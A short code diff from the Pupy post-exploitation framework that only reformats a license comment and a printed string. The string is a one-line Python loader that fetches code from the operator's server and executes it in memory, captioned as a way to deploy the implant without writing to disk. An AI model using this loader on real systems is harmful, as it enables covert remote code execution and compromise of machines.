@@ -1,7 +1,8 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
-# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
+# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root
+# of the project for the detailed licence terms
 
 from __future__ import absolute_import
 from __future__ import division
@@ -75,7 +76,11 @@ def serve_payload(display, server, payload, link_ip=None):
         link_ip = server.address
 
     display(List([
-        "python -c 'import urllib;exec urllib.urlopen(\"http://%s:%s%s\").read()'"%(
-            link_ip, server.web_handler_port, landing_uri),
+        "python -c 'import urllib;exec urllib.urlopen"
+        "(\"http://%s:%s%s\").read()'" % (
+            link_ip, server.web_handler_port, landing_uri
+        ),
     ], caption=Success(
-        'Copy/paste this one-line loader to deploy pupy without writing on the disk')))
+        'Copy/paste this one-line loader to deploy pupy '
+        'without writing on the disk')
+    ))
